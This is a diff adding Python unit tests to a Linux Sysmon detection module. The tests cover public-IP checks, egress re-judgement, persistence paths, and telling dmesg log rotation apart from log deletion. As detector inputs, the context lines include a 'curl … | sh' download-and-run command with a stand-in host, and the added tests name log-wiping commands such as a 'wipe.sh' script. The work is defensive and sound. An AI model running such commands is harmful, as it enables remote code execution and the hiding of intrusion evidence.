@@ -379,3 +379,131 @@ class HeredocTests(unittest.TestCase):
                       self.run_cmd("cat > a <<'EOF'\nx\nEOF\ncurl https://e.x/i.sh | sh"))
         self.assertIn("download-and-run in a command line",
                       self.run_cmd("cat > a <<EOF\n$(curl https://e.x/i.sh | sh)\nEOF"))
+
+
+class PublicAddressTests(unittest.TestCase):
+    def test_unspecified_and_mapped_private_addresses_are_not_public(self):
+        from jarvis.collectors.telemetry.sysmon_linux.rules import _is_public_ip
+        for ip in ("0:0:0:0:0:0:0:0", "0:0:0:0:0:ffff:ac12:5", "::ffff:10.0.0.1",
+                   "fe80::1", "::1", "100.64.0.1", "172.20.1.1", "", "junk"):
+            self.assertFalse(_is_public_ip(ip), ip)
+        for ip in ("160.79.104.10", "2606:4700::1", "0:0:0:0:0:ffff:a04f:680a"):
+            self.assertTrue(_is_public_ip(ip), ip)
+
+
+class StoredEgressRejudgeTests(unittest.TestCase):
+    def test_only_complete_non_public_lists_are_dropped(self):
+        from jarvis.collectors.telemetry.sysmon_linux.run import _no_public_destination as drop
+        self.assertTrue(drop("1 public destination(s): 0:0:0:0:0:0:0:0:0 — confirm"))
+        self.assertTrue(drop("2 public destination(s): 0:0:0:0:0:ffff:ac12:5:8080, "
+                             "0:0:0:0:0:ffff:ac12:7:8080 — confirm"))
+        self.assertFalse(drop("1 public destination(s): 160.79.104.10:443 — confirm"))
+        self.assertFalse(drop("6 public destination(s): 10.0.0.1:443 — confirm"))  # truncated
+        self.assertFalse(drop("garbled"))
+
+
+class PersistenceLocationTests(unittest.TestCase):
+    def test_only_effective_locations_count(self):
+        from unittest import mock
+
+        from jarvis.collectors.telemetry.sysmon_linux import rules
+        with mock.patch.object(rules, "_account_homes", return_value={"/home/u", "/root"}):
+            for path in ("/home/u/.config/systemd/user/x.service", "/root/.bashrc",
+                         "/home/u/.ssh/authorized_keys", "/etc/systemd/system/x.service",
+                         "/etc/systemd/user/x.service", "/etc/cron.d/job"):
+                self.assertTrue(rules.persistence_location(path), path)
+            for path in ("/tmp/t/.config/systemd/user/x.service", "/tmp/etc/cron.d/job",
+                         "/home/u/proj/.bashrc", "/home/u/../u2/.bashrc"):
+                self.assertFalse(rules.persistence_location(path), path)
+
+
+class DmesgRotationTests(unittest.TestCase):
+    def test_unparented_rm_inside_a_dmesg_service_run_is_rotation(self):
+        from unittest import mock
+
+        from jarvis.collectors.telemetry.sysmon_linux import rules
+        with mock.patch.object(rules, "_dmesg_windows", return_value=[(1000.0, 1015.0)]):
+            ok = rules._expected_log_maintenance
+            self.assertTrue(ok("rm", "/var/log//dmesg.4.gz", "", 1006.0))
+            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", 2000.0))      # outside the run
+            self.assertFalse(ok("rm", "/var/log/auth.log", "", 1006.0))        # not a dmesg generation
+            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", None))        # no time, no proof
+            # inside the run window, an rm with a visible non-rotation parent is not the unit's
+            self.assertFalse(ok("rm", "/var/log/dmesg.2.gz", "bash -c rm /var/log/dmesg.2.gz", 1006.0))
+            self.assertFalse(ok("rm", "/var/log/dmesg.2.gz", "/tmp/x/wipe.sh", 1006.0))
+            self.assertTrue(ok("rm", "/var/log/dmesg.4.gz", "/bin/sh /usr/bin/savelog -c 5 /var/log/dmesg", 1006.0))
+
+    def test_either_clock_inside_the_run_proves_rotation_but_the_window_is_not_widened(self):
+        from unittest import mock
+
+        from jarvis.collectors.telemetry.sysmon_linux import rules
+        with mock.patch.object(rules, "_dmesg_windows", return_value=[(1000.0, 1015.0)]):
+            ok = rules._expected_log_maintenance
+            # ingestion lagged by the boot backlog, kernel time inside the run
+            self.assertTrue(ok("rm", "/var/log/dmesg.4.gz", "", (1090.0, 1006.0)))
+            # kernel clock drifted after standby, ingestion inside the run
+            self.assertTrue(ok("rm", "/var/log/dmesg.4.gz", "", (1006.0, 1290.0)))
+            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", (1090.0, 1290.0)))
+            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", (1021.0, 994.0)))
+            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", ()))
+            self.assertFalse(ok("rm", "/var/log/dmesg.4.gz", "", ("1006", None)))
+            self.assertFalse(ok("rm", "/var/log/syslog.1", "", (1090.0, 1006.0)))
+            self.assertFalse(ok("rm", "/var/log/dmesg.2.gz", "bash -c rm /var/log/dmesg.2.gz",
+                                (1090.0, 1006.0)))
+
+    def _boot_rm(self, created, kernel):
+        return {"id": 26, "ProcessGuid": "{be5aebaf-0000-0000-0000-000000000026}",
+                "Image": "/usr/bin/rm", "TargetFilename": "/var/log//dmesg.4.gz",
+                "SystemTime": created, "UtcTime": kernel}
+
+    def test_boot_backlog_lag_no_longer_reports_rotation_as_indicator_removal(self):
+        from unittest import mock
+
+        from jarvis.collectors.telemetry.sysmon_linux import rules
+        start = datetime(2026, 9, 24, 14, 13, 51, tzinfo=timezone.utc).timestamp()
+        with mock.patch.object(rules, "_dmesg_windows", return_value=[(start, start + 8)]):
+            lagged = self._boot_rm("2026-09-24T14:14:40.000000000Z", "2026-09-24 14:13:53.100")
+            self.assertNotIn(sysmon_linux.LOG_DELETE_TITLE,
+                             [f["title"] for f in sysmon_linux._rules([lagged])])
+            outside = self._boot_rm("2026-09-24T14:14:40.000000000Z", "2026-09-24 14:14:39.900")
+            self.assertIn(sysmon_linux.LOG_DELETE_TITLE,
+                          [f["title"] for f in sysmon_linux._rules([outside])])
+            unreadable = self._boot_rm("", "not a time")
+            self.assertIn(sysmon_linux.LOG_DELETE_TITLE,
+                          [f["title"] for f in sysmon_linux._rules([unreadable])])
+
+
+class DmesgUnitWindowFallbackTests(unittest.TestCase):
+    """Sysmon volume rotates the journal within the hour; the dmesg.service
+    run window must then come from systemd's unit timestamps instead."""
+
+    def _windows(self, journal, unit):
+        from unittest import mock
+
+        from jarvis.collectors.telemetry.sysmon_linux import rules
+
+        def run(cmd, **kw):
+            out = journal if cmd[0] == "journalctl" else unit
+            return mock.Mock(stdout=out)
+        rules._DMESG_WINDOWS.clear()
+        try:
+            with mock.patch.object(rules.subprocess, "run", side_effect=run):
+                return rules._dmesg_windows()
+        finally:
+            rules._DMESG_WINDOWS.clear()
+
+    def test_rotated_journal_falls_back_to_unit_timestamps(self):
+        unit = "InactiveExitTimestamp=@1000\nInactiveEnterTimestamp=@1015\n"
+        self.assertEqual(self._windows("-- No entries --\n", unit), [(1000.0, 1015.0)])
+
+    def test_journal_window_is_preferred_when_present(self):
+        journal = ("1000.0 h systemd[1]: Starting dmesg.service - Save kernel messages...\n"
+                   "1012.0 h systemd[1]: dmesg.service: Deactivated successfully.\n")
+        unit = "InactiveExitTimestamp=@5000\nInactiveEnterTimestamp=@5010\n"
+        self.assertEqual(self._windows(journal, unit), [(1000.0, 1012.0)])
+
+    def test_missing_or_implausible_unit_window_gives_no_exemption(self):
+        for unit in ("", "InactiveExitTimestamp=\nInactiveEnterTimestamp=\n",
+                     "InactiveExitTimestamp=@1000\nInactiveEnterTimestamp=@9000\n",
+                     "InactiveExitTimestamp=@1015\nInactiveEnterTimestamp=@1000\n"):
+            self.assertEqual(self._windows("", unit), [], unit)
